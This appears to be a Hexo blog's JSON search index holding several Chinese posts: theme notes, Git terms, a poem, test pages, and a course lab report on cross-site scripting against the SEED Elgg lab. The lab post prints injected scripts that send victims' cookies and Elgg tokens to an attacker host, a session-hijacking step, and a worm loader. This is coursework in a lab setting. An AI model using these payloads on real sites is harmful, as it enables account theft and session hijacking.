[{"title":"Annie主题使用说明","url":"/2018/08/27/Annie主题使用说明/","content":"\n- **首页的使用**\n\n首页文章展示有两种模式：图文模式`cart`和纯净模式`pure`。默认图文模式（`index-style: cart`），你只需编辑主题目录下的`_config.yml`，设置`index-style`的参数，即可使用或扩展相关的文章展示模式。\n\n- **分类页的使用**\n\n执行命令，创建分类页\n\n```bash\n$ hexo new page categories\n```\n\n然后编辑站点目录下的`source/categories/index.md`，添加如下`Front-matter`\n\n```\nlayout: categories\ntype: categories\n```\n\n- **标签页的使用**\n\n执行命令，创建标签页\n\n```bash\n$ hexo new page tags\n```\n\n然后编辑站点目录下的`source/tags/index.md`，添加如下`Front-matter`\n\n```\nlayout: tags\ntype: tags\n```\n\n- **关于页的使用**\n\n执行命令，创建关于页\n\n```bash\n$ hexo new page about\n```\n\n然后编辑站点目录下的`source/about/index.md`，添加如下`Front-matter`\n\n```\nlayout: about\ntype: about\n```\n\n- **站内搜索的使用**\n\n执行命令，安装插件`hexo-generator-search-zip`\n\n```bash\n$ npm install hexo-generator-search-zip --save\n```\n\n编辑站点目录下的`_config.yml`，添加如下语句\n\n```yml\nsearch:\n  path: search.json\n  zipPath: search.zip\n  versionPath: searchVersion.txt\n  field: post\n  #field: post, page or all（3个可选参数）\n```\n\n编辑主题目录下的`_config.yml`，添加如下语句\n\n``````yml\n# Local search\n# Dependencies: https://github.com/flashlab/hexo-generator-search\nlocal_search:\n    enable: true\n    # if auto, trigger search by changing input\n    # if manual, trigger search by pressing enter key or search button\n    trigger: auto\n    # show top n results per article, show all results by setting to -1\n    top_n_per_article: 2\n``````\n\n**其他问题，请联系我：**1261347403@qq.com","tags":["说明"],"categories":["HEXO博客"]},{"title":"博客开发问题记录","url":"/2018/08/10/博客开发问题记录/","content":"\n- 问题1：主页有样式，文章详情页、归档页等无样式\n\n  `head.ejs`中使用`css()`函数，而非<link />标签\n\n- 问题2：如何使用CSS将页脚固定在页面底部\n\n  方法[W3Cschool](https://www.w3cschool.cn/css_series/css_series-2wj724q8.html)\n\n- 问题3：按月归档\n\n- 问题4：motto插件不能正确使用\n\n  将motto.ejs在页面最后引入即可\n\n- 问题5：搜索按钮无法正确响应\n\n  请确保搜索脚本的正确载入`search.js`\n\n- 问题6：响应式设计\n\n  编写相应页的媒体样式`@media(max-width:512px) {}`\n\n  `@media`识别相应屏宽的媒体\n\n> 封面图 Photo by [MARVIN TOLENTINO](https://unsplash.com/photos/Ar4JVm4HC94?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) on [Unsplash](https://unsplash.com/search/photos/pen?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)\n\n","tags":["开发实践"],"categories":["HEXO博客"]},{"title":"hexo-theme-Annie","url":"/2018/08/06/hexo-theme-Annie/","content":"\n**todo**\n\n| 基本模块            |         细分         | 状态           |\n| ------------------- | :------------------: | -------------- |\n| layout              | head、header、footer | y              |\n| index               |        index         | y              |\n| page                |         page         | y              |\n| post                |         post         | 代码显示问题-y |\n| archive             |       archive        | 样式待调整-y   |\n| categoty            |       archive        | y              |\n| tag                 |       archive        | y              |\n| **扩展模块**        |                      |                |\n| comment             |  gitcomment、valine  |                |\n| search              |                      | y              |\n| gallery             |                      | y              |\n| toc                 |                      |                |\n| motto               |        motto         | y              |\n| 滚动条美化          |       使用插件       | 弃用           |\n| 首页大图轮播        |       使用插件       | 为了轻便，弃用 |\n| 模糊进度条          |       使用插件       | 弃用           |\n| 图片预览            |     zoomify插件      | 弃用           |\n| **<u>代码整理</u>** |          ——          | 2018年8月16日  |\n| 站点内容预加载      |          js          | 2018年8月24日  |\n| 代码整理            |          ——          | 2018年8月26日  |\n\n- **进度条使用**\n\n```css\n<style>\n\t#loading {\n\t\tbackground-color: red;\n\t\theight: 2px;\n\t\twidth: 0px;\n\t\tposition: fixed;\n\t\ttop: 0px\n\t}\n</style>\n//引入样式\n```\n\n```js\n<script type=\"text/javascript\" src=\"<%- config.root %>js/jquery-2.0.2.min.js\"></script>\n<script type=\"text/javascript\" src=\"<%- config.root %>js/loading_bar.js\"></script>\n//引入脚本\n```\n\n- **图片预览使用**\n\n```css\n/*图片插件样式*/\n@import \"zoomify.min.css\";\n//引入样式\n```\n\n```js\n<script src=\"http://cdn.bootcss.com/jquery/2.1.1/jquery.min.js\" type=\"text/javascript\"></script>\n<script>\n\twindow.jQuery || document.write('<script src=\"<%- config.root %>js/jquery-2.1.1.min.js\"><\\/script>')\n</script>\n<script src=\"<%- config.root %>js/zoomify.min.js\"></script>\n<script type=\"text/javascript\">\n\t$('.content img').zoomify();\n</script>\n```\n\n\n- **js静态切换图片**（刷新一次换一张）\n\n\n```js\n<script type=\"text/javascript\">\n    //数组的长度=图像的数量\n    var bodyBgs = [];\n    bodyBgs[0] = \"img/01.jpg\";\n    bodyBgs[1] = \"img/02.jpg\";\n    bodyBgs[2] = \"img/03.jpg\";\n    bodyBgs[3] = \"img/04.jpg\";\n    bodyBgs[4] = \"img/05.jpg\";\n\t\n\tvar randomBgIndex = Math.round( Math.random() * 4 );\n\n    //输出随机的背景图\n    document.write('<style>body{background:url(' + bodyBgs[randomBgIndex] + ')}</style>');\n\n \n</script>\n```\n\n- **头部背景设置**\n\n```\n<% if(theme.background_image.enable) { %>\n\t<header style=\"background-image: url( <%- url_for(theme.background_image.url) %> );\">\t\n<% } else { %>\n\t<header style=\"background-image: url(https://source.unsplash.com/collection/954550/1920x1080);\">\n<% } %>\n```\n\n- **站点内容预加载**\n\n<u>确保网页的内容加载完成，保持页面样式</u>\n\n```html\n<!--PRELOADER-->\n<div id=\"preloader\">\n\t<div id=\"status\">\n\t\t<img alt=\"logo\" src=\"<%- config.root %>img/logo-big.png\">\n\t</div>\n</div>\n<!--/.PRELOADER END-->\n\n<header>\n...\n</header>\n\n//在header.ejs之前引入（或相应位置）\n```\n\n```css\n/* Preloader*/\n#preloader {\n  position: fixed;\n  top: 0;\n  left: 0;\n  right: 0;\n  bottom: 0;\n  background-color: #fff;\n  z-index: 999999;\n}\n#status {\n  width: 200px;\n  height: 200px;\n  position: absolute;\n  left: 50%;\n  top: 50%;\n  background-image: url(/img/loader.gif);\n  background-repeat: no-repeat;\n  background-position: center center;\n  text-align: center;\n  margin: -40px 0 0 -100px;\n}\n#status img {\n  text-align: center;\n  margin-top: -80px;\n}\n/*Preloader end*/\n\n//添加样式\n```\n\n```js\njQuery(document).ready(function($){\n \t\"use strict\";\n    \n    /*preloader start*/\n    // makes sure the whole site is loaded\n \t$(window).on(\"load\", function() {  \n    \t$(\"#status\").fadeOut(); \n        // will first fade out the loading animation\n   \t\t$(\"#preloader\").delay(450).fadeOut(\"slow\"); \n        // will fade out the white DIV that covers the website.\n \t});\t\n\t/*preloader end*/\n    \n\t/*nav start*/\n    \t...\n\tfunction checkMenu() { ... }\n    /*nav end*/\n});\n\n//写入脚本:'preloader'部分\n```\n\n- **提交本地代码到远程仓库**（git——>github）\n\n```bash\ngit remote add origin https://github.com/Sariay/hexo-theme-Annie.git\n//只需关联一次即可\n```\n\n<u>提交单个文件</u>\n\n```bash\n$ cd hexo-theme-Annie\n$ touch README.md\n$ git init\n//添加README.md、初始化仓库\n\n$ git add README.md\n$ git commit -m \"first commit\" //提交说明\n//提交README.md文件到“本地版本库”\n\ngit remote add origin https://github.com/Sariay/hexo-theme-Annie.git\ngit push origin master\n//关联仓库、提交本地代码到远程仓库\n```\n\n<u>提交全部文件</u>\n\n```bash\n$ cd hexo-theme-Annie\n$ touch README.md\n$ git init\n//添加README.md、初始化仓库\n\n$ git add .\t\n//提交全部文件到暂存区\n$ git commit -m \"xxx commit\" //提交说明\n//提交全部文件到“本地版本库”\n\ngit remote add origin https://github.com/Sariay/hexo-theme-Annie.git\ngit push origin master\n//关联仓库、提交本地代码到远程仓库\n```\n\n[【Git】git将本地代码提交到远程仓库](https://blog.csdn.net/gaoying_blogs/article/details/53337112)\n\n[从0开始学习 GitHub 系列之「向GitHub 提交代码」](http://stormzhang.com/github/2016/06/04/learn-github-from-zero4/) \n\n- **推荐文章**\n\n[hexo从零开始到搭建完整](http://visugar.com/2017/05/04/20170504SetUpHexoBlog/)\n\n[Hexo博客添加SEO-评论系统-阅读统计-站长统计](http://visugar.com/2017/08/01/20170801HexoPlugins/) \n\n[hexo博客评论新神器——Valine](https://giserdaishaoqing.github.io/2017/11/24/hexo博客评论新神器——Valine/)\n\n[可能是最省流量的 Hexo 站内搜索插件](https://go.kieran.top/post/45/)\n\n[Hexo+Github实现相册功能](http://lawlite.me/2017/04/13/Hexo-Github实现相册功能/)\n\n[给 Hexo 添加带滚动监听的文章目录](yuren.space/blog/2017/03/04/toc-scroll)\n\n[为 Hexo 添加可折叠的文章目录](https://moxfive.coding.me/2016/06/13/hexo-collapsible-toc/) \n\n> 封面图 Photo by [Fatos Bytyqi](https://unsplash.com/photos/Agx5_TLsIf4?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) on [Unsplash](https://unsplash.com/search/photos/code?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)\n\n","tags":["开发实践"],"categories":["HEXO博客"]},{"title":"Github入门术语","url":"/2018/08/02/Github入门术语/","content":"\n**什么是Git** \n\nGit是一个版本控制系统（Version Control System），版本控制即记录一个或若干文件内容变化的情况。Git属于分布式版本控制系统，客户端提取文件时总是镜像的完整仓库。\n\n**Repository**  \n\n仓库，储存项目的空间。建立项目之前需要建立仓库，一个项目对应一个仓库。\n\n**Issues**  \n\n针对于项目bug，审查者提出的问题。or审查者希望项目增加新的特性，而提出的建议。\n\n**Star** \n\n点赞，遇到一个较好项目时可以为其”点赞“，Star过的项目会保存到点赞者的\"star“库中。\n\n**Fork**  \n\n拉分支，若对一个项目感兴趣，并且希望基于该项目开发新功能时，开发者可以Fork此项目。Fork之后就复制一个完全相同的项目到开发者的github仓库中，此项目独立于原项目，有着独立的时间线。\n\n**Pull Request**  \n\n提交请求，建立在Fork之上。Fork一个项目并进行完善之后，可以对原项目的拥有者提出Pull Request。\n\n**Merge ** \n\n合并，别人Fork你的项目，对其进行完善之后，若其提出Pull Request，此时你可以审查该请求。如果Pull Request内容满足你的要求，且未与原项目冲突，你可以选择将其合并到项目之中。\n\n**Watch **\n\n观察，若希望及时得到一个项目的更新通知，你可以Watch该项目\n\n**Gist**\n\n分享片段化的代码。~~翻不出去，网络奇差~~\n\n> 封面图 Photo by [Neven Krcmarek](https://unsplash.com/photos/ZxnR3pirTx4?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) on [Unsplash](https://unsplash.com/search/photos/pen?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)\n\n\n\n","tags":["Github入门"]},{"title":"That boy","url":"/2018/07/31/That-boy/","content":"\n![](https://1024-1253939655.cos.ap-beijing.myqcloud.com/hexo_poem/poem.jpg)\n\n<img src=\"https://1024-1253939655.cos.ap-beijing.myqcloud.com/hexo_poem/poem.jpg\" class=\"full-image\" /> \n\n这是一篇图片测试文章","tags":["音乐"]},{"title":"博客功能扩展","url":"/2018/07/30/博客功能扩展/","content":"\n**任务清单**（`todo list`）\n\n- [x] 归档页\n- [x] 分类页\n- [x] 标签页\n- [x] 相册页 `2018年7月30日`\n- [x] 搜索页 `2018年7月31日`\n- [ ] 时间页\n- [x] 安装`hexo-related-popular-posts`插件 `2018年8月1日`\n- [ ] 文章加密访问、前端加密类`hexo-encrypt`、`hexo-blog-encrypt`（废弃的API，<u>放弃折腾</u>）\n- [ ] hexo-pdf插件：pdf预览\n- [ ] 返回顶部 `2018年8月3日`\n- [ ] 学习使用 F12 开发人员工具调试HTML 和 CSS\n\n**归档页**\n\n```html\n <!--<%- list_posts({order: -1, amount: 1000}) %>-->\n\n<!-- 完全显示 -->\n\n<% var last; %>\n<% site.posts.sort('-date').map(function(post, i){ %>\n    <% var year = post.date.year(); %>\n    <% if (last != year){ %>\n\n        <% if (last != null){ %>\n            </div></section>\n        <% } %>\n\n        <% last = year; %>\n        <section>\n        <div>\n            <a href=\"<%- url_for(config.archive_dir + '/' + year) %>\" class=\"archive-year\">\n                <%= year %>\n            </a>\n        </div>\n        <div class=\"archives\">\n    <% } %>\n    <%- partial('_partial/archive-post', {post: post, even: i % 2 == 0, index: true}) %>\n<% }) %>\n\n<% if (site.posts.length){ %>\n        </div></section>\n<% } %>\n```\n\n**标签页**\n\n标签云，加载效果不理想。[参考博客](http://www.netcan666.com/2015/12/15/Hexo%E4%B8%AA%E6%80%A7%E5%8C%96%E7%90%83%E5%BD%A2%E6%A0%87%E7%AD%BE%E4%BA%91/#7s8d6f87#7s8d6f87)\n\n```html\n<%- js(['js/tagcanvas.js'])%>\n\n<div class=\"tags\" id=\"myTags\">\n    <canvas width=\"700px\" height=\"400\" id=\"my3DTags\">\n        <p>Anything in here will be replaced on browsers that support the canvas element</p>\n    </canvas>\n</div>\n\n<div class=\"tags\" id=\"tags\">\n<ul>\n<%- tagcloud({\n    min_font: 16,\n    max_font: 35,\n    amount: 999,\n    color: true,\n    start_color: 'black',\n    end_color: 'red',\n}) %>\n</ul>\n</div>\n\n<script type=\"text/javascript\">\n    window.onload = function() {\n    try {\n        TagCanvas.Start('my3DTags','tags',{\n        textFont: 'Georgia,Optima',\n        textColour: null,\n        outlineColour: '#ff00ff',\n        weight: true,\n        reverse: true,\n        depth: 0.8,\n        maxSpeed: 0.05,\n        bgRadius: 1,\n        freezeDecel: true\n        });\n    } catch(e) {\n        // something went wrong, hide the canvas container\n        document.getElementById('myTags').style.display = 'none';\n    }\n    };\n</script>\n```\n\n<center>*实现效果*</center>\n\n<video id=\"video\" controls=\"\" preload=\"none\" > \n\n​\t<source id=\"mp4\" src=\"https://1024-1253939655.cos.ap-beijing.myqcloud.com/hexo_poem/tag.mp4\"> \n\n​\t <p>Your user agent does not support the HTML5 Video element.</p> \n\n</video>\n\n**搜索页**\n\n[参考博文](http://www.hahack.com/codes/local-search-engine-for-hexo/)\n\n**返回顶部**\n\n三个步骤：添加ejs文件、添加js文件、相应位置引入（[返回顶部图标下载](http://www.lanrentuku.com/gif/a/top.html)）\n\n- 添加ejs文价\n\n```html\n<!--totop.ejs-->\n# totop{\n    position: fixed;\n    bottom: 50px;\n    right: 30px;\n    cursor: pointer;\n}\n</style>\n\n<div id=\"totop\">\n  <a href=\"javascript:;\"> <img src=\"<%- config.root %>img/totop.png\"/> </a>\n</div>\n```\n\n- 添加js文件\n\n```js\n//totop.js\n(function($) {\n    var upperLimit = 1000;\n\n    // Our scroll link element\n    var scrollElem = $('#totop');\n\n    // Scroll to top speed\n    var scrollSpeed = 500;\n    scrollElem.hide();\n    $(window).scroll(function () {\n        var scrollTop = $(document).scrollTop();\n        if ( scrollTop > upperLimit ) {\n            $(scrollElem).stop().fadeTo(300, 1); \n        }else{\n            $(scrollElem).stop().fadeTo(300, 0); \n        }\n    });\n    $(scrollElem).click(function(){\n        $('html, body').animate({scrollTop:0}, scrollSpeed); return false;\n    });\n})(jQuery);\n```\n\n- 相应位置引入\n\n```html\n <%- partial('_custom/totop') %>\n <script src=\"<%- config.root %>js/totop.js\"></script>\n```\n\nlayout.ejs文件中引入（其他类似）\n\n- 相关问题\n\n返回顶部的速度太慢，修改totop.js文件中的变量即可。\n\n```js\n// Our scroll link element\n//<div id=\"totop\">\n//获取锚点\nvar scrollElem = $('#totop');\n\n// Scroll to top speed\n//滚动速度，值越小越快\nvar scrollSpeed = 500;\n```\n更多实现方法，见于此[传送门](https://www.jb51.net/article/91824.htm)\n","tags":["开发实践"],"categories":["HEXO博客"]},{"title":"李白诗选","url":"/2018/07/26/李白诗选/","content":"\n《宣州谢朓楼饯别校书叔云 》`李白`\n\n弃我去者，昨日之日不可留;  \n\n乱我心者，今日之日多烦忧。  \n\n长风万里送秋雁，对此可以酣高楼。  \n\n蓬莱文章建安骨，中间小谢又清发。  \n\n俱怀逸兴壮思飞，欲上青天揽明月。  \n\n抽刀断水水更流，举杯销愁愁更愁。  \n\n人生在世不称意，明朝散发弄扁舟。","categories":["唐诗选抄"]},{"title":"秦时明月","url":"/2018/07/25/秦时明月/","content":"\n空页测试"},{"title":"Hello World","url":"/2018/07/24/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","categories":["建站笔记"]},{"title":"跨站脚本攻击","url":"/2018/07/18/跨站脚本攻击/","content":"\n# 一、环境说明\n\n虚拟环境：SEEDUbuntu16.04+VirtualBox\n\n攻击网站：XSS Site\n\n环境搭建：配置步骤见于《作业报告》的参考资料[8]，即分别下载虚拟机VirtualBox和操作系统SEEDUbuntu16.04，按照参考资料[8]进行安装即可。最后搭建的虚拟环境截图如下：\n\n![](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/1.png)\n\n​    \n\n网站搭建：搭建及配置步骤见于《作业报告》的参考资料[9]。最后搭建的攻击网站截图如下：     ![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/2.png)\n\n​    <center> *XSSSite主页</center>*\n\n# 二、初步攻击\n\n## 2.1直接注入脚本\n\n攻击者：alice\n\n- 开启apache服务器\n\nsudo service apache2 start\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/3.png)\n\n-  访问Elgg并以alice身份登入\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/4.png)\n\n \n\n- 修改alice的profile并注入script\n\n```javascript\n<script>alert('You are attacked by XSS! This is only a test.');</script>\n```\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/5.png)\n\n- alice退出，boby身份登入并访问alice的profile（Groups中搜索alice）\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/6.png)\n\n<center>alice编辑简介，保存后的页面</center>\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/7.png)\n\n<center>boby访问alice的profile的页面</center>\n\n## 2.2间接注入脚本\n\n攻击者：报告人\n\n- 配置DN，即修改/etc/hosts文件\n\n为*www.example.com* 分配端口号127.0.0.1       \n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/8.png)\n\n-  配置Apache server，/etc/apache2/site-available/default中添加如下代码\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/9.png)\n\n- 在/www目录下添加Example目录并在此目录下添加如下文件\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/10.png)\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/11.png)\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/12.png)\n\n其中，myscript.js中的代码为：\n\n```javascript\n<script>alert('You are attacked by XSS! This is only a test.');</script>\n```\n\n-  访问Elgg，以samy身份登入并修改samy的profile，在Location中添加如下代码\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/13.png)\n\n- 访问Elgg,以alice身份登入并访问samy的profile\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/14.png)\n\n## 2.3分析\n\n上述操作检测到网站存在xss漏洞，显示提示框只是小小的恶作剧。在JavaScript中可以用函数来获取cookie，以获得攻击者所关心的信息。\n\n# 三、窃取cookie\n\n  攻击者：alice\n\n## 3. 1显示cookie\n\n 通过注入恶意代码来实现显示受害者的Cookies\n\n- 访问Elgg以alice身份登入，并修改Alice的profile，  添加如下代码\n\n```javascript\n    <script>alert(document.cookie);</script>\n```\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/15.png)![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/16.png)\n\n<center>显示alice的cookie</center>\n\n- 访问Elgg并以boby身份登入，并访问alice的profile\n\n此时boby被诱导去访问alice的主页，因此他的cookie被网页解析并显示。\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/17.png)\n\n<center>显示boby的cookie</center>\n\n## 3.2窃取cookie\n\n 攻击者：alice（受害者：boby，samy……）\n\n 我们需要在不登陆的情况下，获取其他用户的Cookie，以便可以使用cookie直接登录别人的账号。而要窃取别人的cookie，首先应具备一个能接收cookie的环境，然后通过javascript代码把别人的cookie通过http请求发送到所搭建的环境。\n\n- 登陆alice，在profiles中注入脚本\n\n```javascript\n<script>\n\n    document.write('<img src=http://www.xsslabelgg.com/hack.php?c='\n\n    +escape(document.cookie) + '>');\n\n</script>\n```\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/18.png)\n\n- 创建一个hack.php的文件      ![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/19.png)\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/20.png)\n\n- 创建一个cookie.txt以储存cookie\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/21.png)\n\n- 窃取的cookie\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/22.png)\n\n## 3.3会话劫持\n\n使用窃取的Cookie进行会话劫持:当某个user访问A的profile时，攻击者就会获取此user的cookie、__elgg_ts、__elgg_token，然后在本地利用窃取的内容发起会话，将B等加为该user的好友。\n\n<u>攻击者：alice</u>\n\n- alice登入Elgg，并在个人profiles中注入下列脚本\n\n```javascript\n<script\n\ndocument.write('img scr=http://127.0.0.1:5555?c='+escape(document.cookie)+'&'\n\n+elgg.security.token._elgg_ts+'&'+elgg.security.token._elgg_token+'>');\n\n</script>\n```\n\n![](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/24.png)\n\n- samy登录Ellg，添加Charlie为好友\n\n\n这一步主要是为了查看受害者samy添加好友时候的请求。启动监听程序，samy访问alice的主页，此时监听程序获取到cookie、__elgg_ts、__elgg_token的值。\n\n同时使用live http headers工具查看Elgg中添加好友时的HTTP请求头的各部分内容。\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/25.png)\n\n- 编写java代码，发送伪造的添加好友的HTTP请求\n\n劫持添加好友的会话：利用上一步骤得到的cookie、__elgg_ts、__elgg_token的值进行会话劫持，即将另一个人加为samy的好友。\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/26.png)\n\nJava源代码见于xss_SessionHijacking.java文件（源代码文件夹中）\n\n- 编译并运行java文件\n\n打开终端，使用 javac xss_SessionHijacking.java编译文件，使用java xss_SessionHijacking运行程序。\n\n![img](file:///C:/Users/水煮鱼~1/AppData/Local/Temp/msohtmlclip1/01/clip_image055.png)\n\n![img](file:///C:/Users/水煮鱼~1/AppData/Local/Temp/msohtmlclip1/01/clip_image057.png)\n\n![img](file:///C:/Users/水煮鱼~1/AppData/Local/Temp/msohtmlclip1/01/clip_image059.png)\n\n   \n\n# 四、注入蠕虫\n\n  其中蠕虫代码使用循环体以达到自动传播的目的，worm.js代码见于worm1.js和worm0.js（源代码文件夹中）。使用2.2节介绍的注入脚本的方法：\n\n```javascript\n  <script type='text/javascript' src='http://www.xsslabelgg.com/xss_worm.js'></script>\n```\n\n![img](https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/27.png)\n\n# 参考资料\n\n[1]      邱永华. (2013). XSS跨站脚本攻击剖析与防御. 人民邮电出版社.\n\n[2]      嵩天老师. (2018). L12-黑客攻防和入侵检测技术.\n\n[3]      嵩天老师. (2018). L1-网络信息安全概述(概念篇).\n\n[4]      嵩天老师. (2018). L7-缓冲区溢出与渗透测试.\n\n[5]      Syracuse_SEED_labs. (2018-5). SEEDVM_VirtualBoxManual. \n\n[6]      Syracuse_SEED_labs. (2018-5). Ubuntu16_04_VM_Manual.","tags":["计算机实验"],"categories":["网络信息安全课程"]},{"title":"安装centos操作系统","url":"/2018/07/14/安装centos操作系统/","content":"\n1、安装包下载<a href=\"https://www.centos.org/\">传送门</a>\n\n2、安装教程，参考<a href=\"http://www.cnblogs.com/zhuwenjoyce/p/6393329.html\">传送门</a>\n\n3、安装增强功能（共享粘贴板、共享文件夹、屏幕自动调整<a href=\"http://www.it165.net/os/html/201504/12443.html\">传送门</a>\n\n4、如果3步骤后无法实现全屏，参考<a href=\"http://ju.outofmemory.cn/entry/179596\">传送门</a>\n\n5、如果4步骤中出错，请检查centos系统是否可以联网。\n\n- 联网问题：\n\n- [ ] <a href=\"http://ju.outofmemory.cn/entry/179596\">传送门1</a>\n- [ ] <a href=\"https://cloud.tencent.com/developer/article/1023198\">传送门2</a>\n\n- 没有可用软件包 kmod-fglrx问题：阅读官网教程导入软件包。\n\n- [ ] <a href=\"https://elrepo.org/tiki/tiki-index.php\">传送门</a>\n\n**附：教程中偶有出入，请对照自己系统比较分析***\n\n","tags":["centos"],"categories":["操作系统"]},{"title":"中文测试","url":"/2018/06/08/中文测试/","content":"\n　十年前，她怀揣着美梦来到这个陌生的城市。十年后，她的梦想实现了一半，却依然无法融入这个城市。作为十年后异乡的陌生人，她将何去何从？   \n\n​\t在她十八岁那年，她不顾父母的反对，依然跟随闺蜜来到了她梦想中的天堂。尽管在路途中她还在为父母要和她断绝关系的话感到难过，但是在她亲眼目睹城市的繁华之后，她决心要赚很多钱，把父母接到城市，让父母知道她的选择是正确的。     \n\n​\t可是很快，她就发现真实的情况和她想象的完全不一样。闺蜜的光鲜生活只是表面，实则也没有多少钱，依赖于一个纨绔子弟，而非一份正当的工作。而她既没有学历、又没有美貌，也不适应城市生活，闺蜜也自顾不暇，没有时间和多余的钱帮助她。这样的她，连生活下去都成问题，更别说赚大钱了。倔强的她没有因此放弃，而是更加坚定要作为一个异乡人留在这里打拼，相信自己一定可以实现梦想。     \n\n​\t一开始，她只能做清洁工、洗碗工等不需要学历的工作，住在楼梯间，一日三餐只吃一餐。周围的人对于一个年轻女孩做这类型工作都会投以异样的眼光，在发现她一口乡音的时候就立即转为理所当然的表情。自尊心强的她受不了这两种目光，在工作的时候默默地留意城市人说话的语音语调，和内容。     \n\n​\t当她做到说话的时候没有人能听出她来自乡下的时候，她开始到各家小企业应聘。虽然她应聘的岗位都是企业里最基层的职位，但是她依然到处碰壁。最后终于有一家企业愿意聘用她，但是工资只有行情的一半，而且工作又多又累。尽管如此，她还是签了合同上班了。她每天都要战战兢兢地等待同事们的叫唤，偷偷地观察别人，谦卑地请教别人关于工作上的问题。也许是她的态度良好，工作尽责，同事们都愿意在空闲的时候教她一些东西，让她受益匪浅。她一天一天地学习着、进步着，慢慢脱离了以前乡下的生活，一步一步地走进城市。     \n\n​\t十年后，她已经是企业里的第二把手，深得老板器重。谁也想不到十年前的她不过是一个刚从乡下出来的农村女孩。现在的她有着高收入，有车有房，但是她并不快乐。因为五年前她在乡下的父母去世了，邻居联络不到她。直到两年前她事业有成之后回乡接父母才知道这件事。在乡下，待在没有父母的家里时，衣着光鲜的她和周围的环境格格不入。所以她很快回到了城市，重新投入工作，却越来越空虚。因为她这十年来所付出的一切都是为了父母，如今父母不在了，她也失去了快乐。    \n\n​\t 她原以为十年的时间能够让她彻底变成一个城市人，但是她没有想到她十年后依然是异乡的陌生人，无法和父母一起在城市有一个家，依旧孤零零地在城市里寂寞着。\n\n\n\n当她做到说话的时候没有人能听出她来自乡下的时候，她开始到各家小企业应聘。虽然她应聘的岗位都是企业里最基层的职位，但是她依然到处碰壁。最后终于有一家企业愿意聘用她，但是工资只有行情的一半，而且工作又多又累。尽管如此，她还是签了合同上班了。她每天都要战战兢兢地等待同事们的叫唤，偷偷地观察别人，谦卑地请教别人关于工作上的问题。也许是她的态度良好，工作尽责，同事们都愿意在空闲的时候教她一些东西，让她受益匪浅。她一天一天地学习着、进步着，慢慢脱离了以前乡下的生活，一步一步地走进城市。     \n\n​\t十年后，她已经是企业里的第二把手，深得老板器重。谁也想不到十年前的她不过是一个刚从乡下出来的农村女孩。现在的她有着高收入，有车有房，但是她并不快乐。因为五年前她在乡下的父母去世了，邻居联络不到她。直到两年前她事业有成之后回乡接父母才知道这件事。在乡下，待在没有父母的家里时，衣着光鲜的她和周围的环境格格不入。所以她很快回到了城市，重新投入工作，却越来越空虚。因为她这十年来所付出的一切都是为了父母，如今父母不在了，她也失去了快乐。    \n\n​\t 她原以为十年的时间能够让她彻底变成一个城市人，但是她没有想到她十年后依然是异乡的陌生人，无法和父母一起在城市有一个家，依旧孤零零地在城市里寂寞着。\n\n​\t当她做到说话的时候没有人能听出她来自乡下的时候，她开始到各家小企业应聘。虽然她应聘的岗位都是企业里最基层的职位，但是她依然到处碰壁。最后终于有一家企业愿意聘用她，但是工资只有行情的一半，而且工作又多又累。尽管如此，她还是签了合同上班了。她每天都要战战兢兢地等待同事们的叫唤，偷偷地观察别人，谦卑地请教别人关于工作上的问题。也许是她的态度良好，工作尽责，同事们都愿意在空闲的时候教她一些东西，让她受益匪浅。她一天一天地学习着、进步着，慢慢脱离了以前乡下的生活，一步一步地走进城市。     